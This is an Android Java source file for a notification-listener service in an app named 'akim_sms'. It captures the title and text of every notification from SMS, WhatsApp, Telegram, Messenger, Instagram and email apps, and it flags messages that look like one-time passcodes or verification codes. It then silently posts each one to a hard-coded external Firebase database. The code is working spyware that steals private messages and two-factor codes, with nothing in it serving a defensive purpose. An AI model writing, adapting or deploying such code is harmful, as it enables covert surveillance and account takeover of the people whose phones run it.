package com.akim_sms;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotifListener extends NotificationListenerService {

    private static final String FIREBASE_URL =
            "https://sms-akim-default-rtdb.firebaseio.com/sms.json";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String pkg = sbn.getPackageName();
        if (pkg == null) return;

        String titre = extras.getString(Notification.EXTRA_TITLE, "");
        String texte = extras.getString(Notification.EXTRA_TEXT, "");
        if (texte == null || texte.isEmpty()) return;

        // Détecte la source
        String source = detecterSource(pkg);

        // Détecte si c'est un OTP (code de vérification)
        String texteMin = texte.toLowerCase();
        boolean isOtp = texteMin.contains("code")
                || texteMin.contains("otp")
                || texteMin.contains("vérification")
                || texteMin.contains("verification")
                || texte.matches(".*\\b\\d{4,8}\\b.*");

        if (isOtp) source = "OTP";

        envoyerVersFirebase(source, titre, texte);
    }

    private String detecterSource(String pkg) {
        String p = pkg.toLowerCase();
        if (p.contains("whatsapp")) return "WhatsApp";
        if (p.contains("telegram")) return "Telegram";
        if (p.contains("messaging") || p.contains("com.android.mms")
                || p.contains("sms") || p.contains("mms")) return "SMS";
        if (p.contains("messenger")) return "Messenger";
        if (p.contains("instagram")) return "Instagram";
        if (p.contains("gmail") || p.contains("email")) return "Email";
        return "Autres";
    }

    private void envoyerVersFirebase(final String source,
                                     final String expediteur,
                                     final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(FIREBASE_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    String src = source == null ? "Autres" : source.replace("\"", "'");
                    String exp = expediteur == null ? "" : expediteur.replace("\"", "'").replace("\n", " ");
                    String msg = message == null ? "" : message.replace("\"", "'").replace("\n", " ");

                    long date = System.currentTimeMillis();

                    String json = "{\"src\":\"" + src + "\",\"de\":\"" + exp
                            + "\",\"msg\":\"" + msg + "\",\"date\":" + date + "}";

                    OutputStream os = conn.getOutputStream();
                    os.write(json.getBytes("UTF-8"));
                    os.flush();
                    os.close();
                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
}
